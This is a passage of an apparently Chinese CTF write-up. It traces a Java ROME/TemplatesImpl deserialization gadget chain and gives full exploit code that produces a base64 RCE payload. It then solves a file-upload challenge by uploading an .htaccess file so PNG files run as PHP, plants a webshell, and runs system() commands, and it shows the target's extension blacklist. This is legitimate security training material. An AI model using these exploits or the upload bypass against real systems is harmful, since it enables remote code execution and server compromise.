class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString(), e);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>A3 处当条件为 True 时会进入 <code>defineTransletClasses()</code> 函数：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);	<span class="comment">// A4</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>A4 处反序列化 payload 中的恶意字节码将会被读取，回到上一层函数，在 A5 处恶意字节码被解析调用，从而触发 RCE。</p>
<p>注意调用栈中标记的 A1 与 A2 节点，当 IDEA 进入两个节点之间（包括节点本身）的源码处时字节码会被直接加载，导致 RCE 被提前执行，<code>_class=true</code> 会在上述操作完成时从 <code>true</code> 变为 <code>false</code> 。因此直接从入口节点 <code>hashCode()</code> 往下调试会失败，必须跳过指定节点段来避免字节码的提前加载，从而看到完整的调用链。</p>
<h4 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h4><p>首先需要导入 <code>javassist, rhino</code> 包：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">​</span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mozilla<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rhino<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>触发 <code>getOutputProperties()</code> 链条的测试代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StaticBlock</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 生成恶意 bytecodes</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;System.out.println(\&quot;aaaaaaaaaaa\&quot;);&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StaticBlock.class.getName());</span><br><span class="line">        clazz.setSuperclass(pool.get(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>).getName()));</span><br><span class="line">        clazz.makeClassInitializer().insertBefore(code);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);</span><br><span class="line">        Class[] types = &#123;<span class="type">byte</span>[][].class, String.class, Properties.class, <span class="type">int</span>.class, TransformerFactoryImpl.class&#125;;</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> templatesimpl.getDeclaredConstructor(types);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">TransformerFactoryImpl</span> <span class="variable">tf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br><span class="line">        <span class="type">Properties</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        Object[] params = &#123;bytecodes,<span class="string">&quot;test&quot;</span>,p,<span class="number">1</span>,tf&#125;;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(params);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> templatesimpl.getMethod(<span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line">        method.invoke(object);	<span class="comment">// A6</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行后能成功执行语句 <code>System.out.println(&quot;aaaaaaaaaaa&quot;)</code> ，但也会抛出错误：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.reflect.InvocationTargetException</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:<span class="number">62</span>)</span><br><span class="line">	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">43</span>)</span><br><span class="line">	at java.lang.reflect.Method.invoke(Method.java:<span class="number">498</span>)</span><br><span class="line">	at myremo.EXP.main(EXP.java:<span class="number">30</span>)</span><br></pre></td></tr></table></figure></div>

<p>A6 处调用了 <code>TemplatesImpl.getOutputProperties(constructor.newInstance(params))</code> 函数，下断点直接来到 A3 处且条件为 true，接下来就是读取恶意字节码并生成实例，以完成 RCE。（目前知识有限，没法弄清这里到底发生了什么…）</p>
<p>完整构造链的测试（更看不懂了 &#x3D; &#x3D;）：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myremo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StaticBlock</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 生成恶意 bytecodes</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StaticBlock.class.getName());</span><br><span class="line">        clazz.setSuperclass(pool.get(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>).getName()));</span><br><span class="line">        clazz.makeClassInitializer().insertBefore(code);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化类并设置属性</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldByteCodes</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldByteCodes.set(templatesimpl, bytecodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldName</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldName.set(templatesimpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldTfactory</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        fieldTfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldTfactory.set(templatesimpl, Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>).newInstance());</span><br><span class="line">        <span class="comment">// 注意要通过2个objectbean才能达成触发条件</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templatesimpl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, objectBean1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// hashmap.put触发</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashmap.put(objectBean2,<span class="string">&quot;cccc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>测试了整条构造链的可行性，用 <code>hashmap.put()</code> 来模拟反序列化中调用 <code>hashCode()</code> 函数的行为，触发该函数入口。</p>
<p>构造完整利用链条的 EXP：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StaticBlock</span> &#123; &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 生成恶意 bytecodes</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;open /System/Applications/Calculator.app\&quot;);&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StaticBlock.class.getName());</span><br><span class="line">        clazz.setSuperclass(pool.get(Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>).getName()));</span><br><span class="line">        clazz.makeClassInitializer().insertBefore(code);</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化类并设置属性</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldByteCodes</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldByteCodes.set(templatesimpl, bytecodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldName</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldName.set(templatesimpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldTfactory</span> <span class="operator">=</span> templatesimpl.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        fieldTfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldTfactory.set(templatesimpl, Class.forName(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl&quot;</span>).newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 要通过2个objectbean才能达成触发条件</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(Templates.class, templatesimpl);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ObjectBean.class, objectBean1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置hashmap，参考ysoserial</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldsize</span> <span class="operator">=</span> hashmap.getClass().getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        fieldsize.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldsize.set(hashmap,<span class="number">2</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">nodeC</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//        Object tbl = Array.newInstance(nodeC, 2); 也可以只写入objectBean2, 就是会报错(但还是执行了命令)</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//        Array.set(tbl, 0, nodeCons.newInstance(0, objectBean1, objectBean1, null));</span></span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, objectBean2, objectBean2, <span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">fieldtable</span> <span class="operator">=</span> hashmap.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        fieldtable.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        fieldtable.set(hashmap,tbl);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 输出base64后的序列化数据</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        out.writeObject(hashmap);</span><br><span class="line">        <span class="type">byte</span>[] sss = byteArrayOutputStream.toByteArray();</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(sss);</span><br><span class="line">        System.out.println(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>更改要执行的命令运行程序即可获得 base64 编码后的 payload，如果要传入服务器记得还需要 URL 编码。</p>
<h2 id="WEB-Week5"><a href="#WEB-Week5" class="headerlink" title="WEB-Week5"></a>WEB-Week5</h2><h3 id="Give-me-your-photo-PLZ"><a href="#Give-me-your-photo-PLZ" class="headerlink" title="Give me your photo PLZ"></a>Give me your photo PLZ</h3><p><em>文件上传 <code>.htaccess</code> 文件</em></p>
<p>后端防火墙采用了黑名单，过滤了 <code>php, php3, phtml, pHp, png.php</code> 等诸多关键词与绕过 tricks。但允许上传 <code>.htaccess</code> 文件，文件内容：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.png&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>

<p>上传后上传一个图片格式的一句话木马，测试有效，则 GetShell 成功。</p>
<p>flag 在 env 中，可以用：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tar+-czvf+/var/www/html/upload/html.tar.gz+/var/www/html&#x27;</span>);</span><br></pre></td></tr></table></figure></div>

<p>打包题目源码，直接访问 <code>/upload/html.tar.gz</code> 即可下载。</p>
<p>“index.php”：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;文件上传&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1 align=<span class="string">&quot;center&quot;</span>&gt;大家好，这是一个不会写前端的web手做的图片渲染器，上传图片，我会帮你渲染出来的&lt;/h1&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$extension</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            <span class="variable">$extension</span> = <span class="string">&quot;.&quot;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">end</span>(<span class="variable">$extension</span>));</span><br><span class="line">            <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>, <span class="string">&quot;.php5&quot;</span>, <span class="string">&quot;.php4&quot;</span>, <span class="string">&quot;.php3&quot;</span>, <span class="string">&quot;.php2&quot;</span>, <span class="string">&quot;.php1&quot;</span>, <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.htm&quot;</span>, <span class="string">&quot;.phtml&quot;</span>, <span class="string">&quot;.pht&quot;</span>, <span class="string">&quot;.pHp&quot;</span>, <span class="string">&quot;.pHp5&quot;</span>, <span class="string">&quot;.pHp4&quot;</span>, <span class="string">&quot;.pHp3&quot;</span>, <span class="string">&quot;.pHp2&quot;</span>, <span class="string">&quot;.pHp1&quot;</span>, <span class="string">&quot;.Html&quot;</span>, <span class="string">&quot;.Htm&quot;</span>, <span class="string">&quot;.pHtml&quot;</span>, <span class="string">&quot;.jsp&quot;</span>, <span class="string">&quot;.jspa&quot;</span>, <span class="string">&quot;.jspx&quot;</span>, <span class="string">&quot;.jsw&quot;</span>, <span class="string">&quot;.jsv&quot;</span>, <span class="string">&quot;.jspf&quot;</span>, <span class="string">&quot;.jtml&quot;</span>, <span class="string">&quot;.jSp&quot;</span>, <span class="string">&quot;.jSpx&quot;</span>, <span class="string">&quot;.jSpa&quot;</span>, <span class="string">&quot;.jSw&quot;</span>, <span class="string">&quot;.jSv&quot;</span>, <span class="string">&quot;.jSpf&quot;</span>, <span class="string">&quot;.jHtml&quot;</span>, <span class="string">&quot;.asp&quot;</span>, <span class="string">&quot;.aspx&quot;</span>, <span class="string">&quot;.asa&quot;</span>, <span class="string">&quot;.asax&quot;</span>, <span class="string">&quot;.ascx&quot;</span>, <span class="string">&quot;.ashx&quot;</span>, <span class="string">&quot;.asmx&quot;</span>, <span class="string">&quot;.cer&quot;</span>, <span class="string">&quot;.aSp&quot;</span>, <span class="string">&quot;.aSpx&quot;</span>, <span class="string">&quot;.aSa&quot;</span>, <span class="string">&quot;.aSax&quot;</span>, <span class="string">&quot;.aScx&quot;</span>, <span class="string">&quot;.aShx&quot;</span>, <span class="string">&quot;.aSmx&quot;</span>, <span class="string">&quot;.cEr&quot;</span>, <span class="string">&quot;.sWf&quot;</span>, <span class="string">&quot;.swf&quot;</span>, <span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;上传木马可不是好习惯～～～&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;upload/&quot;</span> . <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_FILES</span>[<span 